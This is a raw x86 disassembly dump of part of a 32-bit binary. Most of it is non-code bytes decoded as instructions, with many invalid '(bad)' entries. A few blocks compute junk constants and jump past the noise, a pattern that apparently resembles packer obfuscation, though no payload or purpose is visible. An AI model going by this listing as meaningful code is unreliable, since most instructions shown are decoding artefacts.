  40be33:	mov    fs,WORD PTR [edi-0xe]
  40be36:	stos   BYTE PTR es:[edi],al
  40be37:	es fs sahf 
  40be3a:	scas   eax,DWORD PTR es:[edi]
  40be3b:	dec    edx
  40be3c:	jnp    0x40beb6
  40be3e:	js     0x40bdd7
  40be40:	fbld   TBYTE PTR [ecx]
  40be42:	ret    0x8f49
  40be45:	add    esi,ebx
  40be47:	inc    esi
  40be48:	dec    eax
  40be49:	rcr    dl,0x93
  40be4c:	call   0x6fd39d4c
  40be51:	sbb    al,0x35
  40be53:	mov    ebp,0x684b4f35
  40be58:	(bad)  
  40be59:	jbe    0x40be3d
  40be5b:	adc    DWORD PTR [ebp+0x3c71bff4],eax
  40be61:	imul   ebx,esp,0xb3984ffd
  40be67:	lods   al,BYTE PTR ds:[esi]
  40be68:	stc    
  40be69:	jae    0x40bdeb
  40be6b:	aaa    
  40be6c:	ret    
  40be6d:	xchg   edx,eax
  40be6e:	bound  ebx,QWORD PTR [esi-0x31448ad1]
  40be74:	or     edi,ecx
  40be76:	pushf  
  40be77:	cs ins BYTE PTR es:[edi],dx
  40be79:	int    0xe0
  40be7b:	jno    0x40be10
  40be7d:	xor    eax,0x736ef794
  40be82:	call   0x9887:0x8313b004
  40be89:	cs mov dh,0xe5
  40be8c:	pop    es
  40be8d:	rol    DWORD PTR [edi-0xd],cl
  40be90:	push   eax
  40be91:	push   cs
  40be92:	xchg   ecx,eax
  40be93:	adc    ch,BYTE PTR [ebp-0x60]
  40be96:	sbb    al,0x35
  40be98:	xchg   edx,eax
  40be99:	push   ebp
  40be9a:	lock inc eax
  40be9c:	call   0xde021201
  40bea1:	fmulp  st(2),st
  40bea3:	mov    al,bh
  40bea5:	cmp    eax,DWORD PTR [ebx+0x16fad651]
  40beab:	sahf   
  40beac:	cwde   
  40bead:	fsub   QWORD PTR [edx-0x2b44d5e2]
  40beb3:	dec    esi
  40beb4:	ret    0x51f0
  40beb7:	mov    dh,BYTE PTR [edi]
  40beb9:	jle    0x40bebc
  40bebb:	mov    DWORD PTR [esi+0x2eb7aa66],eax
  40bec1:	or     BYTE PTR fs:[edx-0x75eb8a21],bh
  40bec8:	or     BYTE PTR [edx+edx*2],bh
  40becb:	and    bl,BYTE PTR [ecx+esi*8]
  40bece:	sbb    DWORD PTR [ebp+0x54acf92a],0xa
  40bed5:	cdq    
  40bed6:	pop    eax
  40bed7:	cmp    esi,DWORD PTR [edi-0x3b]
  40beda:	pop    ss
  40bedb:	loope  0x40bf1c
  40bedd:	aam    0xef
  40bedf:	cmp    dh,BYTE PTR [edi]
  40bee1:	imul   ebp,DWORD PTR [edi+0x6eae475b],0x1a949712
  40beeb:	jne    0x40bef8
  40beed:	test   BYTE PTR [edx+0x5c1aacf7],dl
  40bef3:	inc    esi
  40bef4:	sbb    esi,ebx
  40bef6:	sbb    BYTE PTR [ebx],bh
  40bef8:	mov    dh,0xc9
  40befa:	mov    al,gs:0x175c01aa
  40bf00:	dec    edi
  40bf01:	out    0x76,eax
  40bf03:	inc    ecx
  40bf04:	sub    al,0x95
  40bf06:	rol    bh,1
  40bf08:	inc    ebp
  40bf09:	cld    
  40bf0a:	test   BYTE PTR [ebp+0x0],dh
  40bf0d:	add    bh,al
  40bf0f:	inc    ebp
  40bf10:	clc    
  40bf11:	lahf   
  40bf12:	jl     0x40bf14
  40bf14:	add    BYTE PTR [ebx-0x2dcc07bb],cl
  40bf1a:	push   0x3
  40bf1c:	pop    ecx
  40bf1d:	div    ecx
  40bf1f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf22:	xor    edx,edx
  40bf24:	push   0x2
  40bf26:	add    eax,0x14d3
  40bf2b:	and    eax,ecx
  40bf2d:	mov    ecx,0x6404
  40bf32:	sub    ecx,eax
  40bf34:	mov    DWORD PTR [ebp-0x74],ecx
  40bf37:	mov    DWORD PTR [ebp-0xc],0x13b5
  40bf3e:	mov    DWORD PTR [ebp-0x8],0x2e54
  40bf45:	mov    DWORD PTR [ebp-0x4],0x2f11
  40bf4c:	mov    eax,DWORD PTR [ebp-0x8]
  40bf4f:	mov    ecx,DWORD PTR [ebp-0x4]
  40bf52:	jmp    0x40c35d
  40bf57:	std    
  40bf58:	jno    0x40bf52
  40bf5a:	dec    ecx
  40bf5b:	mov    esp,0x32b9b44c
  40bf60:	rcr    DWORD PTR [esi+0x5eb89f90],1
  40bf66:	sahf   
  40bf67:	inc    edx
  40bf68:	(bad)  
  40bf69:	mov    esi,0xbec492be
  40bf6e:	mov    esi,0x8947918f
  40bf73:	dec    edx
  40bf74:	int3   
  40bf75:	dec    edx
  40bf76:	adc    edi,DWORD PTR [edx]
  40bf78:	pop    edx
  40bf79:	jecxz  0x40bf8c
  40bf7b:	lea    edi,[esi]
  40bf7d:	mov    ah,ch
  40bf7f:	xchg   esi,eax
  40bf80:	and    al,0xf5
  40bf82:	mov    bh,0xa0
  40bf84:	add    BYTE PTR [ebx],0x4a
  40bf87:	popf   
  40bf88:	fldcw  WORD PTR [eax-0x53]
  40bf8b:	xchg   edx,eax
  40bf8c:	pop    ss
  40bf8d:	mov    eax,0xfc0f25f
  40bf92:	jp     0x40bfa6
  40bf94:	mov    DWORD PTR [eax-0x68e18dd],ebx
  40bf9a:	or     eax,0xd35a04c9
  40bf9f:	xchg   ebp,eax
  40bfa0:	push   edx
  40bfa1:	inc    edx
  40bfa2:	pusha  
  40bfa3:	mov    dl,0x12
  40bfa5:	pop    ecx
  40bfa6:	xchg   esi,eax
  40bfa7:	daa    
  40bfa8:	loope  0x40bfc4
  40bfaa:	lods   eax,DWORD PTR ds:[esi]
  40bfab:	push   0xffffffd1
  40bfad:	mov    bl,BYTE PTR [ebp-0x380f4c3f]
  40bfb3:	outs   dx,BYTE PTR ds:[esi]
  40bfb4:	and    al,0x88
  40bfb6:	inc    DWORD PTR [esi]
  40bfb8:	cmp    eax,0x8fecbd90
  40bfbd:	cdq    
  40bfbe:	xchg   DWORD PTR [ebp+0x7d],esi
  40bfc1:	push   ss
  40bfc2:	and    al,0x36
  40bfc4:	sbb    ch,bl
  40bfc6:	sub    al,0xa2
  40bfc8:	push   ebx
  40bfc9:	outs   dx,DWORD PTR ds:[esi]
  40bfca:	xor    ecx,DWORD PTR [edx]
  40bfcc:	sub    DWORD PTR [ebx],esi
  40bfce:	jno    0x40bf5f
  40bfd0:	fwait
  40bfd1:	xor    eax,0xb9081d03
  40bfd7:	retf   0x3ea7
  40bfda:	mov    ebp,0x7eb5cdce
  40bfdf:	cmp    eax,DWORD PTR [eax-0x4e]
  40bfe2:	xchg   esi,eax
  40bfe3:	gs or  ebx,esi
  40bfe6:	mov    dh,0x1b
  40bfe8:	or     DWORD PTR [edi+edx*8+0x15],esi
  40bfec:	jge    0x40c03c
  40bfee:	retf   0xdb67
  40bff1:	daa    
  40bff2:	push   ds
  40bff3:	int    0x17
  40bff5:	lea    esi,[ecx-0x16]
  40bff8:	aad    0xc3
  40bffa:	sar    BYTE PTR [ebx+0x12],1
  40bffd:	jge    0x40bfdb
  40bfff:	add    cl,BYTE PTR [ebx+0x42607ff3]
  40c005:	out    0x23,al
  40c007:	pop    ss
  40c008:	xor    DWORD PTR [ebx-0x5d],esi
  40c00b:	sub    bh,BYTE PTR [esi+0x4b]
  40c00e:	xchg   edi,eax
  40c00f:	jno    0x40bfd4
  40c011:	mov    al,ds:0xa053f9f7
  40c016:	dec    esi
  40c017:	gs cmp esi,eax
  40c01a:	or     BYTE PTR [eax],ch
  40c01c:	push   edx
  40c01d:	pop    ds
  40c01e:	push   edx
  40c01f:	ds inc edi
  40c021:	and    DWORD PTR [ebx],ebx
  40c023:	push   es
  40c024:	dec    ebx
  40c025:	addr16 xor eax,0x72b340c6
  40c02b:	(bad)  
  40c02c:	cmp    ebp,DWORD PTR [ecx]
  40c02e:	jecxz  0x40c0a9
  40c030:	imul   ebp,DWORD PTR [eax],0x19
  40c033:	mov    dl,0xdd
  40c035:	mov    BYTE PTR [esi+0x5d],0xd8
  40c039:	dec    edi
  40c03a:	cwde   
  40c03b:	xchg   edx,eax
  40c03c:	lods   al,BYTE PTR ds:[esi]
  40c03d:	scas   al,BYTE PTR es:[edi]
  40c03e:	xchg   edi,eax
  40c03f:	or     eax,0xa8ff6d45
  40c044:	jecxz  0x40c047
  40c046:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c047:	(bad)  
  40c048:	aad    0xa1
  40c04a:	and    BYTE PTR [esi+eiz*2+0x6fe5c42f],cl
  40c051:	pop    ebp
  40c052:	mov    WORD PTR [edi+eax*2+0x25d62c98],?
  40c059:	fisubr WORD PTR [edi]
  40c05b:	add    edx,esi
  40c05d:	jp     0x40c035
  40c05f:	cmp    esp,0xf4fbe505
  40c065:	movlps QWORD PTR [edx],xmm5
  40c068:	inc    eax
  40c069:	je     0x40c0d4
  40c06b:	pop    ss
  40c06c:	mov    DWORD PTR [ebx],0x1b38d985
  40c072:	cli    
  40c073:	dec    edx
  40c074:	shl    dh,0x65
  40c077:	js     0x40c0b2
  40c079:	(bad)  
  40c07a:	std    
  40c07b:	stc    
  40c07c:	data16 (bad) 
  40c07e:	jne    0x40c071
  40c080:	cwde   
  40c081:	add    al,0xa4
  40c083:	sub    eax,DWORD PTR [ebp-0x4e]
  40c086:	test   DWORD PTR [esi+0x468baf41],ebx
  40c08c:	pusha  
  40c08d:	js     0x40c013
  40c08f:	arpl   WORD PTR [ebp-0x6daea4ac],di
  40c095:	jecxz  0x40c099
  40c097:	mov    bh,0x7e
  40c099:	inc    edx
  40c09a:	pop    ebp
  40c09b:	pop    ss
  40c09c:	push   ecx
  40c09d:	repnz popa 
  40c09f:	lahf   
  40c0a0:	std    
  40c0a1:	and    DWORD PTR [edx-0x7e84ca0d],esi
  40c0a7:	push   ss
  40c0a8:	cdq    
  40c0a9:	sahf   
  40c0aa:	scas   al,BYTE PTR es:[edi]
  40c0ab:	mov    ebx,0xe4fb7cc4
  40c0b0:	sbb    al,0x99
  40c0b2:	iret   
  40c0b3:	cli    
  40c0b4:	cmp    BYTE PTR [edx-0x3c],ch
  40c0b7:	retf   0xf410
  40c0ba:	lahf   
  40c0bb:	push   eax
  40c0bc:	lock out 0x2a,al
  40c0bf:	xor    bl,al
  40c0c1:	pop    esi
  40c0c2:	nop
  40c0c3:	adc    eax,0x51f22d53
  40c0c8:	inc    edx
  40c0c9:	in     al,dx
  40c0ca:	ret    
  40c0cb:	(bad)  
  40c0cc:	sti    
  40c0cd:	push   edx
  40c0ce:	push   ebp
  40c0cf:	into   
  40c0d0:	jns    0x40c05a
  40c0d2:	scas   eax,DWORD PTR es:[edi]
  40c0d3:	imul   esp,DWORD PTR ds:0xef6d7686,0xffffffc9
  40c0da:	mov    bh,0x31
  40c0dc:	test   DWORD PTR [esi],ebx
  40c0de:	inc    esp
  40c0df:	mov    bl,0x5c
  40c0e1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c0e2:	and    BYTE PTR [edi],0xd
  40c0e5:	inc    ecx
  40c0e6:	or     bl,BYTE PTR [edx]
  40c0e8:	adc    eax,0xb5961e49
  40c0ed:	es jp  0x40c0a7
  40c0f0:	sbb    al,0x40
  40c0f2:	sub    DWORD PTR [ebx-0x3d],ecx
  40c0f5:	bound  ecx,QWORD PTR [edx]
  40c0f7:	sbb    esp,DWORD PTR [eax-0x1d]
  40c0fa:	test   eax,0x448485cc
  40c0ff:	dec    eax
  40c100:	retf   0x23fa
  40c103:	ins    BYTE PTR es:[edi],dx
  40c104:	inc    esp
  40c105:	shl    DWORD PTR [eax-0x1ba0031f],1
  40c10b:	push   ebp
  40c10c:	div    BYTE PTR [ebx+0x6f]
  40c10f:	mov    eax,0xbf77a3ae
  40c114:	mov    dh,0x29
  40c116:	adc    ebp,DWORD PTR [eax+eiz*8]
  40c119:	mov    eax,DWORD PTR [eax-0x3416221d]
  40c11f:	sbb    dh,al
  40c121:	fsub   DWORD PTR [esi]
  40c123:	fsub   DWORD PTR [eax+0x34]
  40c126:	inc    edx
  40c127:	imul   esi,DWORD PTR [esi+0x2a],0xfe73313e
  40c12e:	aas    
  40c12f:	inc    edx
  40c130:	pushf  
  40c131:	jg     0x40c152
  40c133:	xor    BYTE PTR ss:[esi+0x88af31c],ah
  40c13a:	(bad)  
  40c13b:	cmp    DWORD PTR [ebp-0x7b6a74a6],edi
  40c141:	daa    
  40c142:	aad    0xd4
  40c144:	stc    
  40c145:	sub    DWORD PTR [ecx],0x1ac0e0eb
  40c14b:	and    ebx,DWORD PTR [esp+ebx*2]
  40c14e:	sbb    esp,esi
  40c150:	jecxz  0x40c111
  40c152:	jne    0x40c0e1
  40c154:	xchg   esi,eax
  40c155:	xchg   edi,eax
  40c156:	retf   
  40c157:	pop    ebp
  40c158:	inc    esi
  40c159:	repnz pusha 
  40c15b:	jo     0x40c1ae
  40c15d:	mov    cl,0x30
  40c15f:	ins    DWORD PTR es:[edi],dx
  40c160:	(bad)  
  40c161:	mov    dl,0xc0
  40c163:	in     eax,0xa8
  40c165:	jle    0x40c116
  40c167:	adc    ebp,esi
  40c169:	sub    DWORD PTR [edx+0x2a],ebx
  40c16c:	cdq    
  40c16d:	imul   BYTE PTR [esi+0x74]
  40c170:	jmp    0x22b5:0xa5903912
  40c177:	pop    esi
  40c178:	push   ecx
  40c179:	mov    eax,0x4e43a14e
  40c17e:	fcom   DWORD PTR [edi]
  40c180:	push   eax
  40c181:	imul   ebx,DWORD PTR [esi+0x47e34cd8],0xa749536c
  40c18b:	mov    dh,0x55
  40c18d:	jmp    0xedf:0xd688c94
  40c194:	je     0x40c12b
  40c196:	mov    bl,0xdd
  40c198:	lods   al,BYTE PTR ds:[esi]
  40c199:	rol    esi,cl
  40c19b:	cmp    esi,0x7f
  40c19e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c19f:	push   ebp
  40c1a0:	push   ecx
  40c1a1:	pop    ebx
  40c1a2:	stos   DWORD PTR es:[edi],eax
  40c1a3:	pop    ebx
  40c1a4:	pop    edx
  40c1a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c1a6:	xchg   ebp,eax
  40c1a7:	in     al,0x46
  40c1a9:	xor    bl,BYTE PTR [ebx]
  40c1ab:	dec    ebx
  40c1ac:	fmul   DWORD PTR [eax+0x297570df]
  40c1b2:	inc    edx
  40c1b3:	int3   
  40c1b4:	cdq    
  40c1b5:	js     0x40c229
  40c1b7:	fldenv [ebx+0x3c7ddf9c]
  40c1bd:	test   eax,0x8220a2b0
  40c1c2:	xchg   ebp,eax
  40c1c3:	punpckhdq mm1,QWORD PTR [ebx]
  40c1c6:	dec    edx
  40c1c7:	jge    0x40c182
  40c1c9:	and    al,0x4b
  40c1cb:	mov    ebx,0x91825e87
  40c1d0:	js     0x40c1f2
  40c1d2:	push   ss
  40c1d3:	pop    esp
  40c1d4:	add    BYTE PTR [ecx+ecx*1+0x1a5f6379],bl
  40c1db:	inc    ebx
  40c1dc:	inc    ebp
  40c1dd:	mov    bl,0x9c
  40c1df:	jg     0x40c25e
  40c1e1:	inc    edx
  40c1e2:	(bad)  
  40c1e3:	inc    ecx
  40c1e4:	aas    
  40c1e5:	sbb    eax,DWORD PTR [edi+0x3b4a873a]
  40c1eb:	scas   eax,DWORD PTR es:[edi]
  40c1ec:	stc    
  40c1ed:	(bad)  
  40c1ee:	data16 or dh,cl
  40c1f1:	add    BYTE PTR [ebx],0x92
  40c1f4:	shl    ebx,cl
  40c1f6:	mov    ecx,ss
  40c1f8:	retf   0x1970
  40c1fb:	rdpmc  
  40c1fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c1fe:	xchg   ebp,eax
  40c1ff:	push   0xbcbe7eaf
  40c204:	jle    0x40c202
  40c206:	jo     0x40c225
  40c208:	ins    BYTE PTR es:[edi],dx
  40c209:	pop    ecx
  40c20a:	jb     0x40c26e
  40c20c:	mov    ah,0x7a
  40c20e:	sub    DWORD PTR [esi-0x1a],edx
  40c211:	xchg   edx,eax
  40c212:	aas    
  40c213:	les    ecx,FWORD PTR [edi+0x49ca8c57]
  40c219:	or     DWORD PTR [edx],0x377f4311
  40c21f:	ins    BYTE PTR es:[edi],dx
  40c220:	adc    BYTE PTR [ebx],0x84
  40c223:	test   eax,0x16a21b2
  40c228:	mov    eax,ecx
  40c22a:	aas    
  40c22b:	sub    BYTE PTR [ebp+0x655bf4a0],dl
  40c231:	leave  
  40c232:	call   0x76bb56b
  40c237:	sub    al,0xa
  40c239:	leave  
  40c23a:	fild   QWORD PTR [edx]
  40c23c:	imul   edx,DWORD PTR [ecx],0xe
  40c23f:	mov    esp,DWORD PTR [ebp+0x42]
  40c242:	sbb    al,0x37
  40c244:	sub    al,0x3c
  40c246:	mov    esp,0x6b4d6953
  40c24b:	neg    DWORD PTR [ebx+0x1f]
  40c24e:	jnp    0x40c26f
  40c250:	cld    
  40c251:	xchg   edi,eax
  40c252:	cld    
  40c253:	cmp    DWORD PTR [ebx-0x51ce30d2],edi
  40c259:	lock ins DWORD PTR es:[edi],dx
  40c25b:	dec    edi
  40c25c:	iret   
  40c25d:	inc    ecx
  40c25e:	add    edx,edx
  40c260:	ss std 
  40c262:	sub    al,0x45
  40c264:	aaa    
  40c265:	ret    0x134d
  40c268:	and    BYTE PTR [eax],al
  40c26a:	sbb    edi,edi
  40c26c:	sub    dl,BYTE PTR [edx-0x3a0bdc79]
  40c272:	pop    edi
  40c273:	add    BYTE PTR [edi+0x6d36b205],dl
  40c279:	leave  
  40c27a:	bound  ecx,QWORD PTR [esi-0x46]
  40c27d:	dec    esi
  40c27e:	sub    BYTE PTR [esi+0x2d1a7f7a],0x8e
  40c285:	sub    eax,0x8f4f4cd5
  40c28a:	retf   
  40c28b:	aad    0xcd
  40c28d:	bound  ebp,QWORD PTR [ebx-0x5cef7459]
  40c293:	push   ebx
  40c294:	push   edi
  40c295:	ffreep st(5)
  40c297:	rol    ah,cl
  40c299:	neg    BYTE PTR [eax-0x6f]
  40c29c:	xor    bh,BYTE PTR ds:[edx]
  40c29f:	call   0x9f13bd5c
  40c2a4:	push   ebp
  40c2a5:	repz or edx,edx
  40c2a8:	push   ebp
  40c2a9:	mov    bh,0xe5
  40c2ab:	fsub   DWORD PTR [ecx+0xc8f7d4c]
  40c2b1:	int    0xd4
  40c2b3:	out    dx,eax
  40c2b4:	jge    0x40c2c4
  40c2b6:	push   esi
  40c2b7:	jecxz  0x40c316
  40c2b9:	push   0x38c32cff
  40c2be:	retf   0xbe1c
  40c2c1:	mov    al,0xfc
  40c2c3:	fs inc ecx
  40c2c5:	retf   0x637b
  40c2c8:	lods   eax,DWORD PTR ds:[esi]
  40c2c9:	dec    ebx
  40c2ca:	sub    dh,BYTE PTR [edx+0x646eee3]
  40c2d0:	cmp    BYTE PTR [eax+0xf],ah
  40c2d3:	and    BYTE PTR [ebp-0x62],bh
  40c2d6:	jns    0x40c298
  40c2d8:	xchg   BYTE PTR [edi+0x8],cl
  40c2db:	mov    BYTE PTR gs:[ebp+0x61],al
  40c2df:	xchg   DWORD PTR [ebx],esp
  40c2e1:	shl    DWORD PTR [ecx+0x6d47c595],1
  40c2e7:	shl    DWORD PTR ds:0xc56c5c28,0xaf
  40c2ee:	(bad)
  40c2f2:	imul   edx,DWORD PTR [edx+eax*4+0xb93a716],0x4768c401
  40c2fd:	xchg   esi,eax
  40c2fe:	scas   eax,DWORD PTR es:[edi]
  40c2ff:	fimul  DWORD PTR [ecx+0x22d4e9ca]
  40c305:	icebp  
  40c306:	scas   eax,DWORD PTR es:[edi]
  40c307:	push   0x364a6636
  40c30c:	retf   
  40c30d:	loopne 0x40c36c
  40c30f:	add    BYTE PTR [eax+0x3f],al
  40c312:	push   0x8f9d4511
  40c317:	push   0xffffffe2
  40c319:	adc    BYTE PTR [eax-0x3dcf9a94],dh
  40c31f:	popf   
  40c320:	xor    al,0xa
  40c322:	xchg   esp,eax
  40c323:	je     0x40c39c
  40c325:	mov    eax,ds:0x7506bbc6
  40c32a:	fidiv  DWORD PTR ds:0x2573c76f
  40c330:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c331:	sbb    WORD PTR [ebx-0x4e17bea],0x84b6
  40c33a:	inc    ecx
  40c33b:	or     BYTE PTR [eax+0x63],0xb3
  40c33f:	ret    0x4b75
  40c342:	inc    ecx
  40c343:	dec    edi
  40c344:	xor    eax,0xfd2a5e72
  40c349:	push   esi
  40c34a:	jmp    0x40c2d0
  40c34c:	jb     0x40c318
  40c34e:	add    ebp,ebx
  40c350:	xor    edi,DWORD PTR [edi-0x462d2a2b]
  40c356:	mov    ds:0xa56b0175,al
  40c35b:	jb     0x40c34e
  40c35d:	lea    eax,[ecx+eax*1-0x65ec]
  40c364:	mov    ecx,0x5e208
  40c369:	div    ecx
  40c36b:	mov    ecx,DWORD PTR [ebp-0xc]
  40c36e:	lea    eax,[eax+ecx*1+0x40c7]
  40c375:	mov    DWORD PTR [ebp-0x24],eax
  40c378:	mov    DWORD PTR [ebp-0x4],0x1bc6
  40c37f:	mov    DWORD PTR [ebp-0x8],0x16ac
  40c386:	mov    DWORD PTR [ebp-0xc],0x2185
  40c38d:	mov    eax,DWORD PTR [ebp-0xc]
  40c390:	mov    ecx,DWORD PTR [ebp-0x8]
  40c393:	xor    eax,0x1f75
  40c398:	sub    eax,ecx
  40c39a:	mov    ecx,DWORD PTR [ebp-0x4]
  40c39d:	sub    eax,ecx
  40c39f:	xor    eax,0xc3e
  40c3a4:	mov    DWORD PTR [ebp-0x58],eax
  40c3a7:	mov    DWORD PTR [ebp-0x14],0x66bd
  40c3ae:	pop    ecx
  40c3af:	mov    DWORD PTR [ebp-0x4],ecx
  40c3b2:	mov    DWORD PTR [ebp-0x8],0x3374
  40c3b9:	mov    DWORD PTR [ebp-0xc],0x3c31
  40c3c0:	mov    eax,DWORD PTR [ebp-0xc]
  40c3c3:	mov    edx,DWORD PTR [ebp-0x8]
  40c3c6:	mov    esi,DWORD PTR [ebp-0x4]
  40c3c9:	xor    eax,edx
  40c3cb:	xor    edx,edx
  40c3cd:	div    esi
  40c3cf:	mov    edx,DWORD PTR [ebp-0x14]
  40c3d2:	and    eax,edx
  40c3d4:	sub    eax,0x680
  40c3d9:	mov    DWORD PTR [ebp-0x24],eax
  40c3dc:	mov    DWORD PTR [ebp-0x30],0x5f68
  40c3e3:	mov    DWORD PTR [ebp-0x2c],0x398b
  40c3ea:	mov    DWORD PTR [ebp-0x4],0x5034
  40c3f1:	mov    DWORD PTR [ebp-0x8],0x7cbf
  40c3f8:	mov    DWORD PTR [ebp-0xc],0x4f6c
  40c3ff:	mov    DWORD PTR [ebp-0x14],0xee2
  40c406:	mov    eax,DWORD PTR [ebp-0x14]
  40c409:	add    eax,DWORD PTR [ebp-0xc]
  40c40c:	mov    edx,DWORD PTR [ebp-0x8]
  40c40f:	xor    eax,edx
  40c411:	mov    edx,DWORD PTR [ebp-0x4]
  40c414:	or     eax,edx
  40c416:	mov    edx,DWORD PTR [ebp-0x2c]
  40c419:	or     eax,edx
  40c41b:	mov    edx,DWORD PTR [ebp-0x30]
  40c41e:	and    eax,edx
  40c420:	mov    edx,0x5b68
  40c425:	sub    edx,eax
  40c427:	mov    DWORD PTR [ebp-0x24],edx
  40c42a:	mov    DWORD PTR [ebp-0x48],0x3308
  40c431:	mov    DWORD PTR [ebp-0x44],0x59a4
  40c438:	mov    DWORD PTR [ebp-0x38],0x2775
  40c43f:	mov    DWORD PTR [ebp-0x34],0x4da
  40c446:	mov    DWORD PTR [ebp-0x40],0x49d8
  40c44d:	mov    DWORD PTR [ebp-0x3c],0x1b5c
  40c454:	mov    DWORD PTR [ebp-0x28],0x338c
  40c45b:	mov    DWORD PTR [ebp-0x24],0x68ed
  40c462:	jmp    0x40c86d
  40c467:	inc    esi
  40c468:	outs   dx,DWORD PTR ds:[esi]
  40c469:	mov    ebx,0x8abcbc70
  40c46e:	ja     0x40c492
  40c470:	or     DWORD PTR [esi-0x79f32231],ebp
  40c476:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c477:	push   ss
  40c478:	iret   
  40c479:	mov    esi,0xbec492be
  40c47e:	mov    esi,0x91e5c098
  40c483:	stc    
  40c484:	adc    edx,DWORD PTR [ebx-0x76]
  40c487:	(bad)
  40c48b:	mov    DWORD PTR [esi+0x65],edx
  40c48e:	dec    esp
  40c48f:	in     al,dx
  40c490:	xchg   edi,eax
  40c491:	and    al,0xfc
  40c493:	out    0xca,eax
  40c495:	push   ebp
  40c496:	sbb    DWORD PTR [edx],ebp
  40c498:	mov    al,0x28
  40c49a:	ja     0x40c498
  40c49c:	ds inc esp
  40c49e:	sbb    ecx,ebp
  40c4a0:	xchg   ebp,eax
  40c4a1:	jnp    0x40c4a4
  40c4a3:	pusha  
  40c4a4:	jns    0x40c438
  40c4a6:	out    dx,eax
  40c4a7:	cli    
  40c4a8:	dec    ebx
  40c4a9:	or     al,0x16
  40c4ab:	mov    bl,0x9f
  40c4ad:	int3   
  40c4ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c4b0:	cld    
  40c4b1:	sub    DWORD PTR [edi-0x4bca507f],edx
  40c4b7:	jno    0x40c48a
  40c4b9:	dec    edi
  40c4ba:	mov    al,0x30
  40c4bc:	scas   al,BYTE PTR es:[edi]
  40c4bd:	xor    al,0x15
  40c4bf:	repnz repz data16 or al,0x95
  40c4c4:	test   eax,0xeb7b4582
  40c4c9:	or     al,BYTE PTR [eax+esi*4]
  40c4cc:	sahf   
  40c4cd:	lea    edi,[ecx]
  40c4cf:	push   edi
  40c4d0:	rol    DWORD PTR ds:[eax+eax*1+0x33615864],0xbd
  40c4d9:	in     eax,dx
  40c4da:	mov    bl,0x89
  40c4dc:	xchg   ebx,eax
  40c4dd:	ja     0x40c53e
  40c4df:	imul   edx,DWORD PTR [ebx],0xffffff86
  40c4e2:	inc    edi
  40c4e3:	xor    al,0x67
  40c4e5:	ja     0x40c500
  40c4e7:	adc    cl,BYTE PTR [ebx-0x6805a95a]
  40c4ed:	adc    eax,0x572f4f0b
  40c4f2:	and    esi,esp
  40c4f4:	bound  eax,QWORD PTR [ecx]
  40c4f6:	sub    eax,0x11ca43a7
  40c4fb:	inc    esp
  40c4fc:	or     al,ch
  40c4fe:	and    BYTE PTR [eax+0x41d153e],dh
  40c504:	in     eax,0xf2
  40c506:	xor    BYTE PTR ds:0x4fc09284,0x77
  40c50d:	xchg   ecx,eax
  40c50e:	test   eax,0x83a5c30e
  40c513:	inc    edx
  40c514:	aas    
  40c515:	iret   
  40c516:	and    al,0x55
  40c518:	repz pop esi
  40c51a:	push   ecx
  40c51b:	shr    DWORD PTR [ebx],0xfa
  40c51e:	jns    0x40c4f3
  40c520:	inc    edx
  40c521:	jecxz  0x40c599
  40c523:	jmp    0x4d52:0xf22983dc
  40c52a:	inc    ebp
  40c52b:	nop
  40c52c:	push   esi
  40c52d:	aaa    
  40c52e:	jle    0x40c531
  40c530:	adc    DWORD PTR [esi],0x2c1fdcd
  40c536:	lds    esp,FWORD PTR [esi]
  40c538:	mov    edx,0x18abd45e
  40c53d:	jle    0x40c543
  40c53f:	ret    
  40c540:	xchg   edi,eax
  40c541:	and    eax,0xf3979801
  40c546:	mov    bh,0xe6
  40c548:	hlt    
  40c549:	pop    es
  40c54a:	bound  ebp,QWORD PTR [esi-0x40]
  40c54d:	stos   DWORD PTR es:[edi],eax
  40c54e:	mov    esi,0x2f373860
  40c553:	dec    ebp
  40c554:	adc    DWORD PTR [eax],eax
  40c556:	cs jmp 0xf718bf84
  40c55c:	jecxz  0x40c574
  40c55e:	pop    ds
  40c55f:	cmp    BYTE PTR [edi],al
  40c561:	neg    DWORD PTR gs:[edx+0x3ad9f32f]
  40c568:	mov    cl,0xe2
  40c56a:	or     DWORD PTR [ebx-0x7698d20c],eax
  40c570:	dec    ecx
  40c571:	mov    ebp,0xdb7727aa
  40c576:	(bad)  [edx]
  40c578:	mov    ecx,0x9589b2d1
  40c57d:	iret   
  40c57e:	inc    edi
  40c57f:	ret    0x5f97
  40c582:	imul   ebp,DWORD PTR [ebx-0x69],0xc2eb2c92
  40c589:	fisubr WORD PTR [edx-0x6a94172f]
  40c58f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c590:	or     al,0x16
  40c592:	mov    eax,ds:0x42fbe34
  40c597:	js     0x40c54d
  40c599:	data16 cs lahf 
  40c59c:	add    dh,BYTE PTR [edi]
  40c59e:	out    0x4d,eax
  40c5a0:	xchg   edx,eax
  40c5a1:	adc    edx,DWORD PTR ds:0x3541fe5c
  40c5a7:	sbb    edx,edx
  40c5a9:	or     al,0x42
  40c5ab:	in     eax,0xe1
  40c5ad:	enter  0xb082,0x2a
  40c5b1:	add    bh,BYTE PTR [ebp+0x69536099]
  40c5b7:	out    0xa7,al
  40c5b9:	(bad)  
  40c5ba:	fist   WORD PTR [esi+0x7bae1107]
  40c5c0:	scas   al,BYTE PTR es:[edi]
  40c5c1:	dec    esi
  40c5c2:	push   ebx
  40c5c3:	ins    DWORD PTR es:[edi],dx
  40c5c4:	in     eax,dx
  40c5c5:	repz lahf 
  40c5c7:	imul   eax,esi,0x3c
  40c5ca:	and    al,0x2a
  40c5cc:	jecxz  0x40c639
  40c5ce:	jbe    0x40c5ab
  40c5d0:	(bad)
  40c5d4:	push   ds
  40c5d5:	ret    0xc477
  40c5d8:	cmp    eax,0xce53254f
  40c5dd:	in     eax,0xbe
  40c5df:	bound  edi,QWORD PTR [edi+0x17299f11]
  40c5e5:	jb     0x40c626
  40c5e7:	shl    BYTE PTR [ebp+0x6f16b777],cl
  40c5ed:	mov    ebx,0x7065444b
